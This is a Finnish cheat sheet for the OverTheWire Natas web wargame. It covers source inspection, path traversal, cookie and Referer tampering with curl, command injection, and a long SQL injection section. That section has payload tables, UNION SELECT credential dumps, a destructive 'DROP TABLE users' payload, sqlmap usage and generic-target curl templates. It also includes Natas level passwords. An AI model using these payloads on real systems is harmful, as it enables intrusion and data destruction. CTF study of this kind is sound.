# Natas lunttilapput

Eli perus harjoittuksien kannalta kertyy ja taso menee vaikeammaksi ja vaikeammaksi. Listataan olennaiset tarkistukset, ettei ole vain yhtÃ¤ tapaa;

- tarkista sivuston koodit ja onko siellÃ¤ vihejeitÃ¤ joko avamalla F12, tai joko sivustolta oikea hiirellÃ¤ "inspect" - ja katso onko koodissa mitÃ¤Ã¤n `username:password`
  - tarkista onko tiedoston polussa mitÃ¤Ã¤n polkuaja kuten `/file/image.jpg`, eli poista image.jpg , ja mene `/file`- polkuun, ja tarkista onko mahdollista olla .txt tiedostoa tai muuta arkistoa
  - lisÃ¤Ã¤ url polkuun `/robots.txt` , jos ois robots tiedosto, niin siellÃ¤ voi lukea lisÃ¤ vinkkejÃ¤. Todellisuudessaan kaikilla sivustoilla ei ole robots.txt-tiedostoa, koska sen kÃ¤yttÃ¶ ei ole pakollista. Jotkut haluavat hakukoneiden indeksoivan kaiken, kun taas toiset eivÃ¤t tarvitse erityisiÃ¤ rajoituksia. Ilman tÃ¤tÃ¤ tiedostoa hakukoneet voivat silti yrittÃ¤Ã¤ indeksoida kaikki lÃ¶ydettÃ¤vissÃ¤ olevat sivut, ellei muita estomekanismeja ole kÃ¤ytÃ¶ssÃ¤.
  - muutamissa tasoissa on **view sourcecode**, joka kertoo tÃ¤mÃ¤n tason vihjeitÃ¤ se ohjeistaa usein uuden vÃ¤lilehden `/index-source.html`, ja siellÃ¤ voi olla pientÃ¤ apua hakkerille, ettÃ¤ miten purettaan seuraavan tason salasansa.
  - kantsii testata onko mahdollista kÃ¤yttÃ¤Ã¤ injektiota pÃ¤Ã¤stÃ¤kseen selvittÃ¤Ã¤ Natas tiedostohakemistoa ja sitÃ¤ juurta `/etc/natas_webpass/natasX` - TÃ¤mÃ¤ myÃ¶s pÃ¤tee URL perÃ¤Ã¤n, ettÃ¤ voiko/kertoa vihjeitÃ¤ tallennettun tiedoston polkua, ettÃ¤ menee tÃ¤hÃ¤n hakemistoon. esim. `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8`

## curl komentoja

kÃ¤ytettÃ¤Ã¤n -Headeri referenssiÃ¤ , ja tÃ¤ssÃ¤ muutama ovat melko samoja, mutta jotekin se objekti/nimi/muuttuja on erissÃ¤ jÃ¤rjestyksessÃ¤ mutta idea on sama;

- EnsimmÃ¤isen linkkissÃ¤ on halutaan mennÃ¤ seuraavaan leveliin, ja jÃ¤lkimmÃ¤isessÃ¤ on nykyinen level ja se level salasansa jonka saattiin selville ja siksi tÃ¤ssÃ¤ lukee (a)natas4-level;  <br>
`$curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- tÃ¤mÃ¤ on sama kuin ylempi, mutta lyhyempi ja tiivistettynÃ¤ vain -H tarkoittaa header; <br>
`$curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- tÃ¤ssÃ¤kin ekana on toistettaan se nykyinen level ja se salasansa, ettÃ¤ haettaan seuraava leveli; <br>
`$curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org`

- tÃ¤ssÃ¤ komennossa tapahtuu ensimmÃ¤isenÃ¤ -u kÃ¤yttÃ¤jÃ¤n autentikoinnin vahvistaminen `<username:password`, seuraavaksi `-b` niin lÃ¤hettÃ¤Ã¤ HTTP-pyynnÃ¶n mukana evÃ¤steen joka on nimetty uusi data="VALUE". TÃ¤tÃ¤ data kantsii tarkistaa sivuston evÃ¤steen nimestÃ¤, koska se nimi saatta olla nimetty muulla nimityksellÃ¤. LÃ¤hetetyn tÃ¤mÃ¤n pyynnÃ¶n jÃ¤lkeen se tallentuu siihen istuntoon ja kannattaa pÃ¤ivittÃ¤Ã¤ sivustoa, ettÃ¤ muuttuiko mitÃ¤Ã¤n. 
`curl -u "natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" -b "data=<NewValue>" http://natas11.natas.labs.overthewire.org/`


- TÃ¤ssÃ¤ versiossa tapahtuu lÃ¤hettÃ¤Ã¤ POST `-d` formaatti kenttÃ¤Ã¤n jos on ja vaikuttaa nimeÃ¤miseen, sitten kÃ¤yttÃ¤en shell/linux komennon  injektiota ja sit vaan submit=submit (tÃ¤tÃ¤ kantsii tarkistaa HTML formaatti nimeÃ¤mistÃ¤) ja -H palvelimen **Referer** headeriÃ¤, sitte -u kÃ¤yttÃ¤jÃ¤n autentikoinnin vahvistamista.
`curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org`



## evÃ¤steen hakeminen ja tarkistus

Oletuksena sivustosta voi tarkistaa evÃ¤steen esim. Chrome DEV tyÃ¶kalusta ja steppi menee: (F12/ oikea hiiren klikkaus **inspect**), sieltÃ¤ vÃ¤lilehdestÃ¤ kuin **application** --> **storage** >> **cookies** ja sieltÃ¤ listasta valitsee tÃ¤mÃ¤n kyseisen sivuston mukaisen mitÃ¤ datoja lÃ¶ytyy. 

TÃ¤mÃ¤ on esimerkki (alempi kuva), mutta idea on sama ja tuotannossa *cookies* listauksia voi olla enemmÃ¤n kuin yksi:
![alt text](./kuvat/level5-7.1.png)


loggin muutettu 0 (false) --> 1 (true)

TÃ¤mÃ¤n komenton suorittamiseen vaattii sen nykyisen levelin salasansa, jotta saa kerrÃ¤ttyÃ¤ sen evÃ¤steet; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt` 

```
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ cat natas5_cookie.txt                                                        
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        0
                                                                                                                                
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ cat natas5_cookie.txt                         
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        1
```

YlemmÃ¤n muutettun loggin=1:seksi, niin sitten suoritettaan ja haettaan sitÃ¤ seuraavan levelin salasannsa; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b "natas5_cookie.txt"`

---


EvÃ¤steen tarkistaminen ja muuttaminen, ettÃ¤ josta voi tomia kuin pikainen tarkistus.

Riippuu jos on kirjautunut admin admin niin antaa special dekoodattu dataa tai muulla salakielellÃ¤, mutt voi normaalisti tehdÃ¤ tarkistuksensa ja tÃ¤ssÃ¤ on pari esimerkkiÃ¤.

![alt text](./kuvat-level16-20/natas19-2.png)

![alt text](./kuvat-level16-20/natas18-9.png)

Tosiaan riittÃ¤Ã¤ kopsaa sen evÃ¤steen kirjauttuneen <value> ja liittÃ¤Ã¤ tuohon alle, eli `echo -n <COOKIES_VALUE> | xxd -r -p`
<br>
```
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ echo -n 3131392d61646d696e | xxd -r -p                             
119-admin                                                                                                                                                      
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ echo -n 39342d61646d696e | xxd -r -p
94-admin                                                                                                                                                                   
```

---

# s3cr3t

Miksi salasana on `s3cr3t`?
Salasana s3cr3t on todennÃ¤kÃ¶isesti tarkoituksellisesti manipuloitu muoto sanasta "secret". Se on yleinen tapa piilottaa salasana tai arvo tekemÃ¤llÃ¤ pieniÃ¤ muunnelmia, kuten vaihtamalla kirjaimia numeroiksi tai muiksi merkeiksi (tÃ¤ssÃ¤ tapauksessa "e" on vaihdettu "3":ksi). TÃ¤llaista kÃ¤ytetÃ¤Ã¤n usein tietoturvahaasteissa, joissa pitÃ¤Ã¤ tunnistaa salasanan muodostustapa.

MikÃ¤ tÃ¤ssÃ¤ voisi paljastaa, ettÃ¤ salasana on "s3cr3t"?
- "debug" parametri: Jos palvelin on konfiguroitu palauttamaan debug-tietoja, se voi antaa vihjeitÃ¤ siitÃ¤, miksi juuri tietynlaista kÃ¤yttÃ¤jÃ¤tunnusta ja salasanaa yritetÃ¤Ã¤n. Esimerkiksi palvelin saattaa paljastaa virheviestejÃ¤, jotka kertovat, miksi kirjautuminen epÃ¤onnistuu tai mihin kohtiin salasana vaikuttaa.

- Salasanan muunnos: Haasteessa saattaa olla selkeÃ¤ logiikka, jossa kÃ¤yttÃ¤jÃ¤n salasanan pitÃ¤Ã¤ olla tavallista muunneltu (kuten "secret" -> "s3cr3t"). TÃ¤llaista kÃ¤ytetÃ¤Ã¤n usein ohjelmoinnissa, koska se on helppo tapa hÃ¤mÃ¤rtÃ¤Ã¤ oikea salasana, mutta se on silti tunnistettavissa.


---

# SQL Injection Lunttilappu â€“ Perusteet & Harjoittelu - START HERE;

## ğŸ”‘ Erikoismerkit ja niiden tarkoitus

| Merkki  | KÃ¤yttÃ¶tarkoitus                          | SQL-vaikutus                        |
|---------|-------------------------------------------|-------------------------------------|
| `'`     | Sulkee yksittÃ¤isen lainauksen            | Rikkoo `'value'` â†’ `'value' OR ...` |
| `"`     | Sulkee tuplalainauksen                   | Rikkoo `"value"` â†’ `"value" OR ...` |
| `--`    | SQL-kommenttimerkki                      | Kommentoi loppu rivistÃ¤ pois        |
| `OR 1=1`| Aina tosi ehto                            | Ohittaa salasanatarkistuksen        |

---

## ğŸŒ URL-enkoodaus (tarvitaan GET-parametreissa)

| Merkki   | Enkoodattu muoto |
|----------|------------------|
| `'`      | `%27`            |
| `"`      | `%22`            |
| ` `      | `%20`            |
| `=`      | `%3D`            |
| `--`     | `%2D%2D` tai `--`|

---

## ğŸ§ª KÃ¤ytÃ¤nnÃ¶n esimerkkitestit

| Testitapa     | SyÃ¶te                                         | Selitys                                |
|---------------|-----------------------------------------------|----------------------------------------|
| Lomake        | `admin" OR 1=1 --`                            | Username-kenttÃ¤Ã¤n syÃ¶tetty injektio    |
| Lomake        | `x`                                           | Password-kenttÃ¤ voi olla mitÃ¤ vain     |
| URL (enkoodattu) | `username=admin%22%20OR%201%3D1%20--&password=x` | Sama injektio URL-parametrina          |
| Curl POST     | `curl -u user:pass -d "username=admin\" OR 1=1 --&password=x" http://target` | LÃ¤hettÃ¤Ã¤ injektion POSTina             |

---

## âœ… Vinkit harjoitteluun ja etenemisen ajattelu

- Aloita yksinkertaisilla injektioilla: `' OR 1=1 --`
- Kokeile molempia: `'` ja `"` eri syÃ¶tekentissÃ¤
- Tarkkaile virheilmoituksia (esim. `bool given`, SQL error)
- Kommentti `--` on tÃ¤rkeÃ¤ katkaisemaan loppulause

### Etenemisen portaikkoa ja vaiheittain

Periaatteessa alkaa lÃ¤htee loogisesti, kÃ¤ytÃ¤nnÃ¶llisesti ja portaikkoina niin kokeillee esim. alkuun onko kÃ¤yttÃ¤jÃ¤tunnus + salasana `admin` . Jos ei ole niin sitten alkaa syÃ¶ttelee erikoismerkkejÃ¤ mm. `"` tai `'` , tai molemmat yhdistettynÃ¤ eli `"'` - huomoithan se on yhteen. Jos kÃ¤yttÃ¤jÃ¤ tunnus ei oiskaan admin - voihan kokeillan muita satunnaisia arvoja mm. `test`, `user`, `root`, `1=1` ja `abc'`ja jne. 

TÃ¤mÃ¤ taulukko kuvaa SQL-injektion testauksen ja hyÃ¶dyntÃ¤misen etenemistÃ¤ vaiheittain. Jokainen vaihe rakentuu edellisen pÃ¤Ã¤lle, mahdollistaen syvemmÃ¤n ymmÃ¤rryksen ja tehokkaamman testauksen.

| Vaihe | Taso                      | Tarkoitus / Toiminta                                                  | EsimerkkejÃ¤                                                         |
|-------|---------------------------|------------------------------------------------------------------------|----------------------------------------------------------------------|
| 1     | ğŸ” Haavoittuvuuden tunnistus | Testaa pÃ¤Ã¤seekÃ¶ syÃ¶te SQL-kyselyyn                                    | `'` , `"` , `admin'`                                                 |
| 2     | ğŸ› ï¸ Perus injektio         | Riko rakenne ja ohita kirjautuminen                                   | `admin' OR 1=1 --` , `admin" OR 1=1 --`                              |
| 3     | ğŸŒ URL-testit             | Sama injektio URL-parametreissa (enkoodattuna)                        | `username=admin%27%20OR%201%3D1%20--&password=x`                     |
| 4     | ğŸ§ª Muunnelmat             | Eri ehto- ja rakennevariaatiot                                        | `OR 'a'='a'` , `OR 1=1 LIMIT 1` , `OR 1=1#`                          |
| 5     | ğŸ§± Rakenneanalyysi        | Testaa montako saraketta, missÃ¤ kohtaa lause menee rikki              | `ORDER BY 1` , `ORDER BY 2` , sulkujen rikkominen                   |
| 6     | ğŸ§© UNION SELECT -hyÃ¶kkÃ¤ys | YhdistÃ¤ omia valintoja SQL:Ã¤Ã¤n, yritÃ¤ hakea kÃ¤yttÃ¤jÃ¤tietoja            | `UNION SELECT 1,2 --` , `UNION SELECT username, password FROM users --` |
| 7     | ğŸ”„ Automatisointi (sqlmap)| Automatisoi kaikki yllÃ¤ olevat vaiheet ja hae tietokantatietoja        | `sqlmap -u "http://target?username=*" --dbs`                        |

## ğŸ“Œ Vinkit etenemiseen:

- ğŸ”¸ Testaa ensin manuaalisesti (lomake tai URL)
- ğŸ”¸ Tarkkaile virheilmoituksia (esim. SQL-syntaksivirheitÃ¤)
- ğŸ”¸ KÃ¤ytÃ¤ oikeita enkoodauksia URL:issa
- ğŸ”¸ Dokumentoi, mikÃ¤ toimii missÃ¤kin vaiheessa

---

## ğŸ“Œ Esimerkkilause SQL:ssÃ¤

```
SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="salasana"
```

# SQL Injection â€“ Vaihtoehtoiset esimerkit kÃ¤yttÃ¤jÃ¤nimellÃ¤ `admin` - START HERE

| SyÃ¶te                            | Tarkoitus / Kommentti                                             |
|----------------------------------|-------------------------------------------------------------------|
| `admin" OR 1=1 --`               | Klassikko â€“ sulkee " ja ohittaa salasanan                        |
| `admin' OR 1=1 --`               | Sama idea mutta yksittÃ¤isellÃ¤ `'`-merkillÃ¤                       |
| `admin" OR '1'='1' --`           | Sama kuin yllÃ¤, mutta kirjaimellisesti tosi ehto                |
| `admin" OR 1=1#`                 | Joissain tietokannoissa `#` toimii kommenttina (`--` sijaan)     |
| `admin') OR ('1'='1`             | KÃ¤ytetÃ¤Ã¤n joskus, kun sisÃ¤kkÃ¤isiÃ¤ sulkuja on kyselyssÃ¤           |
| `admin" OR 1=1 LIMIT 1 --`       | Rajoittaa tuloksia (joissain tapauksissa hyÃ¶dyllinen)            |
| `admin" UNION SELECT 1,2 --`     | UNION hyÃ¶kkÃ¤ys (jos haetaan useita kenttiÃ¤)                      |
| `admin"; DROP TABLE users --`    | Tuhovaikutus (jos SQL on huonosti suojattu)                      |

---

## Huomioita

- `admin` voi olla mikÃ¤ tahansa tunnettu kÃ¤yttÃ¤jÃ¤nimi â€“ ideana on sulkea alkuperÃ¤inen `"admin"` ja lisÃ¤tÃ¤ oma ehto perÃ¤Ã¤n.
- `--` kommentoi loppuosan, jolloin esim. `AND password="..."` ei enÃ¤Ã¤ vaikuta.
- VÃ¤lilyÃ¶nnit tÃ¤ytyy **enkoodata URL:issa** (`%20`) ja erikoismerkit kuten `"`, `'`, `=` vastaavasti.

---

## Esimerkki URL:ina (enkoodattuna)

HTML: `/index.php?username=admin%22%20OR%201%3D1%20--&password=x` 

ja vastaa tÃ¤hÃ¤n SQL muodossa: `SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="x"`

--- 

# ğŸ§ª SQL Injection Curl-Komennot â€“ Lunttitaulukko

TÃ¤ssÃ¤ taulukossa on eri tapoja kÃ¤yttÃ¤Ã¤ `curl`-komentoa SQL-injektiotestauksessa. Mukana GET- ja POST-esimerkit sekÃ¤ lomake- ja URL-parametrien kÃ¤yttÃ¶.

| Muoto       | Kuvaus                              | Komento                                                                                             |
|-------------|--------------------------------------|------------------------------------------------------------------------------------------------------|
| âœ… GET       | Perus injektio URL-parametrina      | `curl "http://target.site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`                 |
| âœ… POST      | LÃ¤hettÃ¤Ã¤ tiedot lomakekentistÃ¤      | `curl -X POST -d "username=admin' OR 1=1 --&password=x" http://target.site/index.php`                |
| ğŸ” HTTP Auth| Peruskirjautuminen (esim. natas)     | `curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org"`       |
| ğŸŒ GET + Auth| GET-injektio autentikoinnilla        | `curl -u user:pass "http://site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`           |
| ğŸ§ª POST + Auth| POST-injektio autentikoinnilla       | `curl -u user:pass -X POST -d "username=admin' OR 1=1 --&password=x" http://site/index.php`          |
| ğŸ“ Enkoodattu| KÃ¤yttÃ¤Ã¤ URL-enkoodattuja arvoja      | `curl "http://site/index.php?username=admin%22%20OR%201%3D1%20--&password=x"`                        |
| ğŸ§ª UNION     | UNION SELECT -testi                  | `curl -X POST -d "username=admin' UNION SELECT 1,2 --&password=x" http://target.site/index.php`      |

---

## ğŸ“Œ VinkkejÃ¤:

- KÃ¤ytÃ¤ `--data` tai `-d` POST-pyynnÃ¶issÃ¤ (`application/x-www-form-urlencoded` oletus).
- KÃ¤ytÃ¤ `-u` jos kohde vaatii HTTP basic authentication.
- Enkoodaa erikoismerkit GET-parametreissa (`'` = `%27`, `"` = `%22`, vÃ¤lilyÃ¶nti = `%20`).
- LisÃ¤Ã¤ `?debug=1` tai vastaava jos sivusto tukee virheen tulostamista.

```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
     -d "username=admin' OR 1=1 --&password=x" \
     http://natas14.natas.labs.overthewire.org/index.php
```


















